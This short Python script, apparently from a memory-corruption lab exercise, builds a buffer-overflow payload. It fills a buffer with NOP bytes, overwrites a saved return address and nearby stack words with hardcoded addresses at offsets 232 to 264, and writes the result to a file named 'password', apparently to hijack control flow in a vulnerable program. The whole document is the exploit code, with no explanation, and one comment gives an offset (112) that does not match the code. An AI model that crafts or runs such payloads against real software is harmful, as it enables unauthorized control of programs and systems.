import sys 
 
# Fill the content with NOPs 
content = bytearray(0x90 for i in range(300)) 

# Put the address at offset 112 
ret = 0x5555555551e9
dem = 0x7fffffffd6a0
content[232:240] = (ret).to_bytes(8,byteorder='little') 
content[240:248] = (dem).to_bytes(8,byteorder='little')
content[248:256] = (dem).to_bytes(8,byteorder='little')
content[256:264] = (dem).to_bytes(8,byteorder='little')
# Write the content to a file 
with open('password', 'wb') as f: 
    f.write(content) 